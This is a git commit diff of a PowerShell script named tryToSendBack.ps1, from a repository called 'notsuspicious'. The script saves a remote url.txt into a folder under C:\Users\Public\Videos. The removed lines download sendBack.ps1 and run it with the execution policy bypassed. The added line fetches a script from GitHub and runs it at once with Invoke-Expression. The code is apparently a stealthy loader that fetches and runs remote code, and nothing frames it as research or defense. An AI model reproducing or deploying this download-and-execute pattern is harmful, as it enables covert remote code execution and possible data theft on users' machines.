63708e52a17e863da51695fbccae72e70e0e21e0
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-03-01 11:32:32 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -3,13 +3,7 @@ try {
     Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
     
     # Download sendBack.ps1
-    $ps1Content = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.ps1" -UseBasicParsing).Content
-    $ps1FilePath = "C:\Users\Public\Videos\sendBack.ps1"
-    $ps1Content | Out-File -FilePath $ps1FilePath -Encoding UTF8
-    
-    # Execute the PowerShell script
-    $command = "powershell.exe -ExecutionPolicy Bypass -File '$ps1FilePath'"
-    Invoke-Expression -Command $command
+    Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/tryToSendBack.ps1" -UseBasicParsing).Content
 }
 catch {
     # Handle exceptions here
